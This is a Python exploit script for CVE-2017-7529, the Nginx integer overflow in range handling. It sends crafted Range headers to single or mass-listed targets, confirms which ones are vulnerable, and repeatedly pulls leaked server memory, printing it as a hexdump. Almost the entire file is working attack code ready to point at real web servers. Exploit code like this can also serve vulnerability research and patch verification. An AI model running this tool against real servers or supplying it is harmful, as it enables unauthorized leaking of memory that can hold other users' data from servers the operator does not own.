#  Nginx versions since 0.5.6 up to and including 1.13.2 are vulnerable
#  CVE-2017-7529

import urllib.parse
import requests
import argparse

global colorama, termcolor
try:
    import colorama, termcolor
    colorama.init(autoreset=True)
except Exception:
    termcolor = colorama = None

colored = lambda text, color="", dark=False: (
    termcolor.colored(text, color or "white", attrs=["dark"] if dark else [])
    if termcolor and colorama else text
)

class Exploit(requests.Session):
    buffer = set()

    def __init__(self, url):
        super().__init__()
        length = int(requests.get(url).headers.get("Content-Length", 0)) + 623
        self.headers = {
            "Range": f"bytes=-{length},-9223372036854{776000 - length}"
        }
        self.target = urllib.parse.urlsplit(url)

    def check(self):
        try:
            response = self.get(self.target.geturl(), timeout=5)
            return response.status_code == 206 and "Content-Range" in response.text
        except Exception:
            return False

    def hexdump(self, data):
        for b in range(0, len(data), 16):
            line = data[b:b + 16]
            print(colored(
                " -  {:04x}: {:48} {}".format(
                    b,
                    " ".join(f"{char:02x}" for char in line),
                    "".join(chr(char) if 32 <= char <= 126 else "." for char in line)
                ),
                dark=True
            ))

    def execute(self):
        vulnerable = self.check()
        print(colored(
            f"[{'+' if vulnerable else '-'}] {self.target.netloc} is Vulnerable: {str(vulnerable).upper()}",
            "white" if vulnerable else "yellow"
        ))

        if not vulnerable:
            return

        data = b""
        while len(self.buffer) < 0x80:
            try:
                response = self.get(self.target.geturl())
                for line in response.content.split(b"\r\n"):
                    if line not in self.buffer:
                        data += line
                        self.buffer.add(line)
                print(colored(f"[i] Receiving Data [{len(data)} bytes] ..."), end="\r")
            except KeyboardInterrupt:
                print(colored("\n[!] Keyboard Interrupted!", "red"))
                break
            except Exception as e:
                print(colored(f"\n[!] {type(e).__name__}: {e}", "red"))
                break

        if data:
            print()
            self.hexdump(data)


def normalize_url(target):
    target = target.strip()
    if not target:
        return None
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    return target


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="CVE-2017-7529",
        description="Nginx integer overflow vulnerability scanner",
    )
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-f", "--file", help="File with list of IPs/URLs")
    parser.add_argument("-c", "--check", action="store_true", help="Only check vulnerability")
    args = parser.parse_args()

    targets = []

    if args.url:
        url = normalize_url(args.url)
        if url:
            targets.append(url)

    if args.file:
        with open(args.file, "r") as f:
            for line in f:
                url = normalize_url(line)
                if url:
                    targets.append(url)

    if not targets:
        parser.error("You must specify --url or --file")

    for target in targets:
        try:
            exploit = Exploit(target)
            if args.check:
                vulnerable = exploit.check()
                print(colored(
                    f"[{'+' if vulnerable else '-'}] {exploit.target.netloc} is Vulnerable: {str(vulnerable).upper()}",
                    "white" if vulnerable else "yellow"
                ))
            else:
                exploit.execute()
        except KeyboardInterrupt:
            print(colored("\n[!] Scan interrupted by user", "red"))
            break
        except Exception as e:
            print(colored(
                f"[!] {urllib.parse.urlsplit(target).netloc}: {type(e).__name__}",
                "red"
            ))
